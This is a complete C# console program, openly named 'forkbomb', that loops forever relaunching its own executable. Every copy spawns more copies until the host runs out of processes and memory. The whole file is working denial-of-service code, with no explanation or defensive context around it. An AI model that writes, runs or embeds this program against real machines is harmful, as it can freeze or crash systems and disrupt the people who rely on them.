using System;
using System.Diagnostics;
namespace forkbomb
{
    class Program
    {
        static void Main(string[] args)
        {
            while (true)
            {
                Process.Start(Environment.GetCommandLineArgs()[0]);
            }
        }
    }
}
